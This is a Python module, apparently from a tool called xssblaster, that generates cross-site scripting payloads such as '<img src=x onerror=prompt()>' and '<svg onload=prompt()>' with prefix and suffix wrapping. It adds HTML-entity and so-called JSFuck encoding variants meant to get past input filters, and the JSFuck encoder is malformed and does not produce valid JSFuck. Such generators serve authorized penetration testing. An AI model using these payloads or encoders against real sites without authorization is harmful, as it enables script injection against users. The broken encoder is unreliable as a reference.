# xssblaster/core.py
from typing import Dict, Generator, Optional, Tuple


def generate_payloads(
    prefix: str = "",
    suffix: str = "",
    encode_prefix: bool = False,
    encode_suffix: bool = False,
    payload_file: Optional[str] = None,
    variant_filters: Optional[Dict[str, bool]] = None,
) -> Tuple[Generator[Tuple[int, str], None, None], int, int]:
    """
    Generate XSS payloads with various encoding techniques.

    Args:
        prefix: Prefix to add to each payload
        suffix: Suffix to add to each payload
        encode_prefix: Whether to encode the prefix
        encode_suffix: Whether to encode the suffix
        payload_file: Path to custom payload file
        variant_filters: Dictionary of variant filters to apply

    Returns:
        Tuple of (payloads_generator, num_base_payloads, total_payloads)
    """
    # Default variant filters if none provided
    if variant_filters is None:
        variant_filters = {"base": True}

    # Load payloads from file or use default
    if payload_file:
        with open(payload_file) as f:
            base_payloads = [line.strip() for line in f if line.strip()]
    else:
        # Default payloads
        base_payloads = [
            "prompt({n})",
            "<img src=x onerror=prompt({n})>",
            "<svg onload=prompt({n})>",
            # Add more default payloads as needed
        ]

    # Define encoding functions
    def jsfuck_encode(s: str) -> str:
        # Simplified JSFuck encoding
        return f"[][`${[] + []}`[1]+'o'+`${{}}`[2]+'n'+'s'+'t'+'r'+'u'+'c'+'t'+'o'+'r']`return\\`${s}\\```"

    def html_entity_encode(s: str) -> str:
        return "".join(f"&#{ord(c)};" for c in s)

    # Add more encoding functions...

    # Calculate total count upfront
    variants_per_payload = 0
    if variant_filters.get("base", False):
        variants_per_payload += 1
    if variant_filters.get("jsfuck", False):
        variants_per_payload += 1
    if variant_filters.get("html_entity", False):
        variants_per_payload += 1
    # Add more variant counts as needed...

    total = len(base_payloads) * variants_per_payload

    # Generate payloads
    counter = 1

    def generate_variants(payload: str) -> Generator[Tuple[int, str], None, None]:
        nonlocal counter
        variants = []

        # Apply variant filters
        if variant_filters.get("base", False):
            variants.append(payload)

        if variant_filters.get("jsfuck", False):
            variants.append(jsfuck_encode(payload))

        if variant_filters.get("html_entity", False):
            variants.append(html_entity_encode(payload))

        # Add more variants based on filters...

        # Generate final payloads
        for variant in variants:
            # Replace placeholders
            final = variant.replace("{n}", str(counter))
            if encode_prefix:
                final = html_entity_encode(prefix) + final
            else:
                final = prefix + final

            if encode_suffix:
                final = final + html_entity_encode(suffix)
            else:
                final = final + suffix

            yield (counter, final)
            counter += 1

    # Create generator for all payloads
    def payload_generator():
        for payload in base_payloads:
            yield from generate_variants(payload)

    return payload_generator(), len(base_payloads), total
